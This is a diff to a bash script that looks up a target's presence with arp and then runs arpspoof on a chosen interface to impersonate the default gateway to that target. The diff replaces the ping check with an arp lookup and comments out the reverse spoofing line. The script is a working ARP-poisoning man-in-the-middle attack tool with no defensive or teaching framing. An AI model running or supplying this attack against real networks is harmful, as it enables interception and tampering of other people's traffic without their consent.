@@ -4,12 +4,12 @@ open(){
 read -p "What Interface do you want to use(ex: wlan0)" INT
 gateway=$(/sbin/ip route | awk '/default/ { print $3}')
 echo "${TARGET}"
-    ping -c 1 -t 1 ${TARGET} > /dev/null 2> /dev/null  # ping and discard output
+    #ping -c 1 -t 1 ${TARGET} > /dev/null 2> /dev/null  # ping and discard output
+    arp -n ${TARGET} > /dev/null 2> /dev/null #use arp instead of ping for speed
     if [ $? -eq 0 ]; then  # check the exit code
         echo "${TARGET} is up; Starting ARPspoof" # display the output
-        # you could send this to a log file by using the >>pinglog.txt redirect
 	arpspoof -i ${INT} -t ${TARGET} ${gateway} &
- 	arpspoof -i ${INT} -t ${gateway} ${TARGET} &
+ 	#arpspoof -i ${INT} -t ${gateway} ${TARGET} &
     else
         echo "${TARGET} is down"
     fi
